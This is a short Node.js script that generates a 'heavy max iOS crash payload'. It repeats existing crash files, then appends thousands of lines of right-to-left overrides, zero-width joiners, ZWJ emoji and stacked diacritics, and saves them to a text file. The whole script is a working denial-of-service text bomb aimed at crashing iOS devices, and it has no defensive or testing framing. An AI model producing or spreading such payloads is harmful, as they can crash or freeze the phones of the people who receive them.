import fs from "fs";
import path from "path";

const bugsFolder = path.join(process.cwd(), "bugs");
if (!fs.existsSync(bugsFolder)) fs.mkdirSync(bugsFolder);

const crashFiles = [
  "combo_invisible.txt",
  "singleline_crash.txt",
  "mentions.json"
];

let combinedPayload = "";

// Append existing crash files multiple times
for (const file of crashFiles) {
  const filePath = path.join(bugsFolder, file);
  if (fs.existsSync(filePath)) {
    const content = fs.readFileSync(filePath, "utf8");
    for (let i = 0; i < 20; i++) {  // repeat to increase size
      combinedPayload += content + "\n";
    }
  }
}

// Aggressive iOS Unicode + emoji payload
const rtl = "\u202E";        // Right-to-left override
const lrm = "\u200E";        // Left-to-right mark
const zwj = "\u200D";        // Zero-width joiner
const zwnj = "\u200C";       // Zero-width non-joiner
const diacritics = "\u0300\u0301\u0302\u0303\u0304\u0305\u0306\u0307"; // stacked accents
const emoji = "👨‍👩‍👧‍👦";    // ZWJ emoji family

for (let i = 0; i < 2000; i++) {  // huge repetition
  combinedPayload += rtl + emoji + diacritics.repeat(10) + zwj + zwnj + lrm + "\n";
}

// Save the max heavy crash file
const outPath = path.join(bugsFolder, "max_ios_crash_heavy.txt");
fs.writeFileSync(outPath, combinedPayload, "utf8");

console.log(`✅ Heavy max iOS crash payload created at ${outPath} | Length: ${combinedPayload.length}`);
